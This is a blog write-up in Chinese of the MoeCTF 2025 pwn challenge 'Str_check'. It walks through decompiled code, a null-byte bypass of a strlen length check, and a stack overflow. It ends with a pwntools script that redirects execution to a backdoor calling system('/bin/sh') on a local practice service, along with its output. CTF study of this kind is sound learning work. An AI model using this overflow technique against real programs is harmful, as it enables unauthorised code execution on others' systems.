---
title: '西电CTF MoeCTF 2025 PWN Str_check'
date: '2026-09-05T09:24:45+08:00'
lastmod: '2026-09-05T09:24:45+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=863)

还是IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char dest[24]; // [rsp+0h] [rbp-20h] BYREF
  size_t n; // [rsp+18h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("What can u say?");
  __isoc99_scanf("%255s", str);
  puts("So,what size is it?");
  __isoc99_scanf("%zu", &n);
  len = strlen(str);
  if ( (unsigned __int64)len > 0x18 )
  {
    puts("Oh,too much.");
    exit(1);
  }
  if ( !strncmp(str, "meow", 4uLL) )
    memcpy(dest, str, n);
  else
    strncpy(dest, str, n);
  puts("You're right.");
  return 0;
}
```

> 注意到这里使用`strlen()`来限制长度小于等于0x18。
>
> 但是strlen只会计算到第一个`\0`后返回（`\0`不计入长度)。并且对我们输入的长度n也没有进行额外的检查。
>
> 所以我们可以在前0x19中插入一个`\0`来绕过检查。



并且

>     memcpy(dest, str, n);
>     strncpy(dest, str, n);
> strncpy遇到`\0`会立刻停止读取。
>
> 所以我们需要使用memcpy，也就是令str的前四个字符为`meow`。



再次集中注意力，注意到:

```c
int backdoor()
{
  return system("/bin/sh");
}
```

看起来还是经典栈溢出ret。

所以我们要构造字符串和n来覆盖函数返回地址。



```assembly
text:0000000000401236 ; int backdoor()
.text:0000000000401236                 public backdoor
.text:0000000000401236 backdoor        proc near
.text:0000000000401236 ; __unwind {
.text:0000000000401236                 endbr64
.text:000000000040123A                 push    rbp
.text:000000000040123B                 mov     rbp, rsp
.text:000000000040123E                 lea     rax, command    ; "/bin/sh"
.text:0000000000401245                 mov     rdi, rax        ; command
.text:0000000000401248                 call    _system
.text:000000000040124D                 nop
.text:000000000040124E                 pop     rbp
.text:000000000040124F                 retn
.text:000000000040124F ; } // starts at 401236
.text:000000000040124F backdoor        endp
```

目标地址为`0x40123E`。



字符串前0x18字节构造为`b'meow' + b'\0' * (0x18 - 0x4)`

注意到这里溢出会影响n，所以我们在0x19后填充一个8字节的`p64()`.

再填8字节任意字符，最后是p64的目标地址。



pwntools脚本:

 ```python
 from pwn import *
 import ctypes
 context(arch='amd64', os='linux', log_level='info')
 
 io = connect("127.0.0.1", 24461)
 
 
 add = 0x40123e
 
 io.sendline(b'meow' + b'\0' * 0x14 + p64(0x18 + 0x8 + 0x8 + 0x8)  + b'A' * 8 + p64(add))
 
 io.sendline(str(0x18 + 0x18).encode())
 
 io.interactive()
 ```



输出:

```
[x] Opening connection to 127.0.0.1 on port 24461
[x] Opening connection to 127.0.0.1 on port 24461: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 24461: Done
[*] Switching to interactive mode
What can u say?
So,what size is it?
You're right.
cat flag
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 24461
```

